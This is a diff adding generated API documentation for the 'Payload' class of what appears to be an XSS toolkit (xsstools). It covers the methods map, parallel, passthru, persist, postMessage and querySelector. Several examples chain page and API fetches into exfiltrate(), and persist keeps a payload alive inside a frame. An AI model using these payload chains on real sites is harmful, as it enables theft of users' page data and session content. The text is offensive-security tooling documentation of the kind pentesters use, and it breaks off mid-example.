+    <p>Take an array from the pipe an call the payload for each element, all calls are made simultaneously.<br>
+<br>
+Each payload take an element from the array as an argument</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"[Any]","label":"map(payload)","children":["payload","payload","payload"],"async":true,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .fetchDOM("/")
+              .querySelectorAll("a", "href")
+              .map(
+                  Payload.new().fetchText()
+                )
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-map">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-map" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>payload</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+|
+
+<span class="param-type">function</span>
+
+
+            
+            </td>
+
+            
+
+            
+
+            <td class="description last"><p>to run for each elements of the pipe value,</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Take an array from the pipe an call the payload for each element, all calls are made simultaneously.<br>\n     * <br>\n     * Each payload take an element from the array as an argument\n     * @graph $Payload -> {[Any]} ($current)[payload,payload,payload]* {[Any]} -> $Payload\n     * @param {Payload|Function} payload to run for each elements of the pipe value,\n     * @example\n     * const p = Payload.new()\n     *               .fetchDOM(\"/\")\n     *               .querySelectorAll(\"a\", \"href\")\n     *               .map(\n     *                   Payload.new().fetchText()\n     *                 )\n     *               .exfiltrate()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[5417,5655],"filename":"Payload.js","lineno":158,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001515","name":"Payload#map","type":"MethodDefinition","paramnames":["payload"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Take an array from the pipe an call the payload for each element, all calls are made simultaneously.<br>\n<br>\nEach payload take an element from the array as an argument</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"[Any]\",\"label\":\"map(payload)\",\"children\":[\"payload\",\"payload\",\"payload\"],\"async\":true,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"[Any]","label":"map(payload)","children":["payload","payload","payload"],"async":true,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"params":[{"type":{"names":["Payload","function"]},"description":"<p>to run for each elements of the pipe value,</p>","name":"payload"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .fetchDOM(\"/\")\n              .querySelectorAll(\"a\", \"href\")\n              .map(\n                  Payload.new().fetchText()\n                )\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"map","longname":"Payload#map","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000142","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"map","signature":"<span class=\"signature\">(payload)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line132">132</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="parallel">
+      <a href="#params-parallel"><span class="type-signature"></span>parallel</a><span class="signature">(&hellip;payloads)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>This add multiple payload to eval simultaneously with the current pipe value.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"parallel(...payloads)","children":["payload-1","payload-2","payload-3"],"async":true,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .parallel(
+                  Payload.new().fetchDOM("/"),
+                  Payload.new().fetchDOM("/api")
+              .exfiltrate()
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-parallel">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-parallel" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>payloads</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+|
+
+<span class="param-type">function</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                    &lt;repeatable><br>
+                
+                </td>
+            
+
+            
+
+            <td class="description last"><p>Payloads to run simultaneously,</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * This add multiple payload to eval simultaneously with the current pipe value.\n     * @param {...(Payload|Function)} payloads Payloads to run simultaneously,\n     * @graph $Payload -> {Any} ($current)[payload-1,payload-2,payload-3]* {[Any]} -> $Payload\n     * @example\n     * const p = Payload.new()\n     *               .parallel(\n     *                   Payload.new().fetchDOM(\"/\"),\n     *                   Payload.new().fetchDOM(\"/api\")\n     *               .exfiltrate()\n     *\n     * eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[4408,4664],"filename":"Payload.js","lineno":132,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001463","name":"Payload#parallel","type":"MethodDefinition","paramnames":["payloads"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>This add multiple payload to eval simultaneously with the current pipe value.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"Any\",\"label\":\"parallel(...payloads)\",\"children\":[\"payload-1\",\"payload-2\",\"payload-3\"],\"async\":true,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["Payload","function"]},"variable":true,"description":"<p>Payloads to run simultaneously,</p>","name":"payloads"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"parallel(...payloads)","children":["payload-1","payload-2","payload-3"],"async":true,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .parallel(\n                  Payload.new().fetchDOM(\"/\"),\n                  Payload.new().fetchDOM(\"/api\")\n              .exfiltrate()\n\neval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"parallel","longname":"Payload#parallel","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000140","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"parallel","signature":"<span class=\"signature\">(&hellip;payloads)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line94">94</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="passthru">
+      <a href="#params-passthru"><span class="type-signature"></span>passthru</a><span class="signature">(code_or_func, &hellip;args)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>This add a function to eval to the payload,
+the function take the value in the pipe as an argument named _
+the value return by the function is ignored, the previous value on pipe
+is keeped.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"passthru(code_or_func, ...args)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .eval(()=>42)                 # pipe value set to 42
+              .passthru(v=>console.log(v))  # log the value of the pipe
+              .exfiltrate()                 # 42
+
+eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-passthru">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-passthru" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>code_or_func</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+|
+
+<span class="param-type">function</span>
+|
+
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                </td>
+            
+
+            
+
+            <td class="description last"><p>to eval on the target,
+if code_or_func is a function, then is converted to string.</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>args</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">any</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+
+                
+
+                
+                    &lt;repeatable><br>
+                
+                </td>
+            
+
+            
+
+            <td class="description last"><p>arguments to bind to the function</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * This add a function to eval to the payload,\n     * the function take the value in the pipe as an argument named _\n     * the value return by the function is ignored, the previous value on pipe\n     * is keeped.\n     * @public\n     * @param {string|function|Payload} code_or_func to eval on the target,\n     * if code_or_func is a function, then is converted to string.\n     * @param {...any} args arguments to bind to the function\n     * @graph $Payload -> {Any} ($current) -> $Payload\n     * @example\n     * const p = Payload.new()\n     *               .eval(()=>42)                 # pipe value set to 42\n     *               .passthru(v=>console.log(v))  # log the value of the pipe\n     *               .exfiltrate()                 # 42\n     *\n     * eval(p.run())\n     * @graphStep skip\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[3192,3496],"filename":"Payload.js","lineno":94,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100001387","name":"Payload#passthru","type":"MethodDefinition","paramnames":["code_or_func","args"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>This add a function to eval to the payload,\nthe function take the value in the pipe as an argument named _\nthe value return by the function is ignored, the previous value on pipe\nis keeped.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"Any\",\"label\":\"passthru(code_or_func, ...args)\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","access":"public","params":[{"type":{"names":["string","function","Payload"]},"description":"<p>to eval on the target,\nif code_or_func is a function, then is converted to string.</p>","name":"code_or_func"},{"type":{"names":["any"]},"variable":true,"description":"<p>arguments to bind to the function</p>","name":"args"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"passthru(code_or_func, ...args)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .eval(()=>42)                 # pipe value set to 42\n              .passthru(v=>console.log(v))  # log the value of the pipe\n              .exfiltrate()                 # 42\n\neval(p.run())"}],"tags":[{"originalTitle":"graphStep","title":"graphstep","text":"skip","value":"skip"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"passthru","longname":"Payload#passthru","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000136","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"passthru","signature":"<span class=\"signature\">(code_or_func, &hellip;args)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line764">764</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="persist">
+      <a href="#params-persist"><span class="type-signature"></span>persist</a><span class="signature">(callback<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Try to make the payload persistant by wrapping the content in a frame.<br></p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"persist(callback=null)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Example</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()
+              .persist(
+                Payload.new().eval(d=>d.location).exfiltrate()
+              )
+
+return eval(p.run())</code></pre>
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-persist">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-persist" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>callback</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">function</span>
+|
+
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    null
+                
+                </td>
+            
+
+            <td class="description last"><p>called each time the frame load, with the current document</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Try to make the payload persistant by wrapping the content in a frame.<br>\n     * @graph $Payload ->  ($current)  -> $Payload\n     * @param {Function|Payload} [callback=null] called each time the frame load, with the current document\n     * @example\n     * const p = Payload.new()\n     *               .persist(\n     *                 Payload.new().eval(d=>d.location).exfiltrate()\n     *               )\n     *\n     * return eval(p.run())\n     * @returns {Payload} The new payload object in the chain.\n     *\n     */","meta":{"range":[28322,29672],"filename":"Payload.js","lineno":764,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100002882","name":"Payload#persist","type":"MethodDefinition","paramnames":["callback"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Try to make the payload persistant by wrapping the content in a frame.<br></p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":null,\"label\":\"persist(callback=null)\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":null,"label":"persist(callback=null)","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"params":[{"type":{"names":["function","Payload"]},"optional":true,"defaultvalue":null,"description":"<p>called each time the frame load, with the current document</p>","name":"callback"}],"examples":[{"caption":"","code":"const p = Payload.new()\n              .persist(\n                Payload.new().eval(d=>d.location).exfiltrate()\n              )\n\nreturn eval(p.run())"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"persist","longname":"Payload#persist","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000214","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"persist","signature":"<span class=\"signature\">(callback<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line832">832</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="postMessage">
+      <a href="#params-postMessage"><span class="type-signature"></span>postMessage</a><span class="signature">(name<span class="signature-attributes">opt</span>, target<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Read the pipe value and send it to a frame using postMessage<br>
+<br>
+The pipe value is not modified.</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"postMessage(name=\"top\", target=\"*\")","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-postMessage">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-postMessage" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+        <th>Attributes</th>
+        
+
+        
+        <th>Default</th>
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>name</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    "top"
+                
+                </td>
+            
+
+            <td class="description last"><p>Name of the targeted frame</p></td>
+        </tr>
+
+    
+
+        <tr>
+            
+                <td class="name"><code>target</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">string</span>
+
+
+            
+            </td>
+
+            
+                <td class="attributes">
+                
+                    &lt;optional><br>
+                
+
+                
+
+                
+                </td>
+            
+
+            
+                <td class="default">
+                
+                    "*"
+                
+                </td>
+            
+
+            <td class="description last"><p>Target for the message</p></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <div class="bs-callout bs-callout-success">
+    <h5>Returns </h5>
+
+        
+<div class="param-desc">
+    <p>The new payload object in the chain.</p>
+</div>
+
+
+
+<dl class="param-type">
+    <dt>
+        Type
+    </dt>
+    <dd>
+        
+<span class="param-type"><a href="Payload.html">Payload</a></span>
+
+
+    </dd>
+</dl>
+
+    
+</div>
+  
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * Read the pipe value and send it to a frame using postMessage<br>\n     * <br>\n     * The pipe value is not modified.\n     * @param {string} [name=\"top\"] Name of the targeted frame\n     * @param {string} [target=\"*\"] Target for the message\n     * @graph $Payload -> {Any} ($current)  -> $Payload\n     * @returns {Payload} The new payload object in the chain.\n     */","meta":{"range":[31155,31314],"filename":"Payload.js","lineno":832,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100003244","name":"Payload#postMessage","type":"MethodDefinition","paramnames":["name","target"]},"vars":{"":null},"shortpath":"Payload.js"},"description":"<p>Read the pipe value and send it to a frame using postMessage<br>\n<br>\nThe pipe value is not modified.</p><script type=\"graph\">[{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"},{\"readType\":\"Any\",\"label\":\"postMessage(name=\\\"top\\\", target=\\\"*\\\")\",\"children\":null,\"returnType\":null},{\"readType\":\"\",\"returnType\":\"\",\"html\":\"<a href='./Payload.html'>Payload</a>\"}]</script>","params":[{"type":{"names":["string"]},"optional":true,"defaultvalue":"\"top\"","description":"<p>Name of the targeted frame</p>","name":"name"},{"type":{"names":["string"]},"optional":true,"defaultvalue":"\"*\"","description":"<p>Target for the message</p>","name":"target"}],"graph":[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Any","label":"postMessage(name=\"top\", target=\"*\")","children":null,"returnType":null},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}],"returns":[{"type":{"names":["Payload"]},"description":"<p>The new payload object in the chain.</p>"}],"name":"postMessage","longname":"Payload#postMessage","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000238","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"postMessage","signature":"<span class=\"signature\">(name<span class=\"signature-attributes\">opt</span>, target<span class=\"signature-attributes\">opt</span>)</span><span class=\"type-signature\"> &rarr; {<a href=\"Payload.html\">Payload</a>}</span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line707">707</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="postMultipart">
+      <a href="#params-postMultipart"><span class="type-signature"></span>postMultipart</a><span class="signature">(callback)</span><span class="type-signature"></span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="collapse_" id="methodCollapse-postMultipart">
+
+  
+
+  
+
+<!-- details.tmpl -->
+
+
+
+
+
+
+
+
+<dl class="dl-horizontal">
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+</dl>
+
+
+
+
+
+
+
+
+  <div id="params-postMultipart" class="bs-callout bs-callout-primary">
+    <h5>Parameters</h5>
+    <!--params.tmpl-->
+
+
+<table class="table table-bordered">
+    <thead>
+    <tr>
+        
+        <th>Name</th>
+        
+
+        <th>Type</th>
+
+        
+
+        
+
+        <th class="last">Description</th>
+    </tr>
+    </thead>
+
+    <tbody>
+    
+
+        <tr>
+            
+                <td class="name"><code>callback</code></td>
+            
+
+            <td class="type">
+            
+                
+<span class="param-type">*</span>
+
+
+            
+            </td>
+
+            
+
+            
+
+            <td class="description last"></td>
+        </tr>
+
+    
+    </tbody>
+</table>
+
+  </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+
+<!--
+<pre>
+{"comment":"/**\n     * \n     * @param {*} callback \n     */","meta":{"range":[26201,26989],"filename":"Payload.js","lineno":707,"columnno":4,"path":"/home/bitk/ywh/git/xsstools/src","code":{"id":"astnode100002658","name":"Payload#postMultipart","type":"MethodDefinition","paramnames":["url","data","opt"]},"vars":{"":null},"shortpath":"Payload.js"},"params":[{"type":{"names":["*"]},"name":"callback"}],"name":"postMultipart","longname":"Payload#postMultipart","kind":"function","memberof":"Payload","scope":"instance","___id":"T000002R000200","___s":true,"attribs":"<span class=\"type-signature\"></span>","id":"postMultipart","signature":"<span class=\"signature\">(callback)</span><span class=\"type-signature\"></span>","ancestors":["<a href=\"Payload.html\">Payload</a>#"]}
+</pre>
+-->
+</div>
+
+        
+            <!--method.tmpl-->
+<div class="method-details">
+
+
+
+  <!--source-link.tmpl-->
+
+
+<div class="pull-right source-link-container">
+  <code class="source-link" data-tmpl="method-tmpl(1)">
+    <i class="fa fa-file-o"></i>
+    <a href="Payload.js.html">Payload.js</a>:<a href="Payload.js.html#line471">471</a>
+  </code>
+</div>
+
+
+
+
+    
+
+    
+
+    <h4 class="name" id="querySelector">
+      <a href="#params-querySelector"><span class="type-signature"></span>querySelector</a><span class="signature">(selector_or_func, attr<span class="signature-attributes">opt</span>)</span><span class="type-signature"> &rarr; {<a href="Payload.html">Payload</a>}</span>
+
+    </h4>
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+<div class="description">
+    <p>Take the pipe value and search for the first element matching the selector, the element is then set as the pipe value.
+If attr is passed to the function, only the corresponding attribute is passed in the pipe</p><script type="graph">[{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"},{"readType":"Document","label":"querySelector(selector_or_func, attr=null)","children":null,"returnType":"HTMLElement | Any"},{"readType":"","returnType":"","html":"<a href='./Payload.html'>Payload</a>"}]</script>
+</div>
+
+
+
+
+    <h5>Examples</h5>
+    
+    <pre class="prettyprint"><code>const p = Payload.new()                                       # by default the pipe value is set to window.document
+              .querySelector('title')                       # get the title element
+              .passthru(el => el.innerText = 'New title')   # change the title
+
